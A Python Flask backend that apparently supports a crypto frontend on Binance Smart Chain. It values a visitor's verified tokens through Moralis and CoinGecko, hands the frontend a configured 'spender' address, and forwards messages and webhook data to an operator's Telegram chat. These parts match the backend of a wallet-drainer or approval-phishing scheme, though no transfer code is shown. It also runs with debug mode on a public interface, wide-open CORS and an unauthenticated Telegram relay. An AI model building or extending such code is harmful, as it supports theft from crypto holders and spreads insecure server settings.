from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import json
from datetime import datetime

# Load environment variables
load_dotenv()
app = Flask(__name__)
CORS(app)

# API Keys from environment variables
MORALIS_API_KEY = os.getenv('MORALIS_API_KEY')
COINGECKO_API_KEY = os.getenv('COINGECKO_API_KEY')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
USDT_ADDRESS = os.getenv('USDT_ADDRESS')
SPENDER_ADDRESS = os.getenv('SPENDER_ADDRESS')

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/api/token-price', methods=['GET'])
def get_token_price():
    """Get token price from CoinGecko API"""
    token_address = request.args.get('token_address')
    
    if not token_address:
        return jsonify({"error": "token_address parameter is required"}), 400
    
    if not COINGECKO_API_KEY:
        return jsonify({"error": "CoinGecko API key not configured"}), 500
    
    try:
        url = f"https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain"
        params = {
            'contract_addresses': token_address,
            'vs_currencies': 'usd',
            'x_cg_demo_api_key': COINGECKO_API_KEY
        }
        
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            data = response.json()
            token_data = data.get(token_address.lower(), {})
            price = token_data.get('usd', 0)
            return jsonify({"price": price, "token_address": token_address})
        else:
            return jsonify({"error": "Failed to fetch price", "status_code": response.status_code}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/wallet-tokens', methods=['GET'])
def get_wallet_tokens():
    """Get wallet tokens from Moralis API"""
    address = request.args.get('address')
    
    if not address:
        return jsonify({"error": "address parameter is required"}), 400
    
    if not MORALIS_API_KEY:
        return jsonify({"error": "Moralis API key not configured"}), 500
    
    try:
        url = f"https://deep-index.moralis.io/api/v2/{address}/erc20"
        headers = {
            "accept": "application/json",
            "X-API-Key": MORALIS_API_KEY
        }
        params = {
            "chain": "bsc",
            "exclude_spam": "true"
        }
        
        response = requests.get(url, headers=headers, params=params)
        
        if response.status_code == 200:
            data = response.json()
            tokens = data.get('result', data)
            
            # Filter verified tokens only
            verified_tokens = [token for token in tokens if token.get('verified_contract') == True]
            
            return jsonify({
                "tokens": verified_tokens,
                "address": address,
                "total_tokens": len(verified_tokens)
            })
        else:
            return jsonify({"error": "Failed to fetch wallet tokens", "status_code": response.status_code}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/send-telegram', methods=['POST'])
def send_telegram():
    """Send message to Telegram"""
    data = request.get_json()
    
    if not data or 'message' not in data:
        return jsonify({"error": "message is required"}), 400
    
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return jsonify({"error": "Telegram credentials not configured"}), 500
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": data['message'],
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload)
        
        if response.status_code == 200:
            return jsonify({"success": True, "message": "Message sent successfully"})
        else:
            return jsonify({"error": "Failed to send message", "status_code": response.status_code}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/config', methods=['GET'])
def get_config():
    """Get configuration values (non-sensitive only)"""
    return jsonify({
        "usdt_address": USDT_ADDRESS,
        "spender_address": SPENDER_ADDRESS,
        "has_moralis_key": bool(MORALIS_API_KEY),
        "has_coingecko_key": bool(COINGECKO_API_KEY),
        "has_telegram_config": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    """Webhook endpoint for receiving data from frontend"""
    data = request.get_json()
    
    if not data:
        return jsonify({"error": "No data provided"}), 400
    
    # Log the webhook data (you can process this as needed)
    print(f"Webhook received: {json.dumps(data, indent=2)}")
    
    # You can add custom processing logic here
    # For example, save to database, send notifications, etc.
    
    return jsonify({"success": True, "message": "Webhook processed successfully"})

@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    # Check if required environment variables are set
    missing_vars = []
    required_vars = ['MORALIS_API_KEY', 'COINGECKO_API_KEY', 'USDT_ADDRESS', 'SPENDER_ADDRESS']
    
    for var in required_vars:
        if not os.getenv(var):
            missing_vars.append(var)
    
    if missing_vars:
        print("WARNING: Missing environment variables:")
        for var in missing_vars:
            print(f"  - {var}")
        print("Please set these in your .env file or environment")
    
    # Get port from environment or default to 8000 (since frontend runs on 5000)
    port = int(os.getenv('PORT', 8000))
    
    print(f"Starting backend server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=True)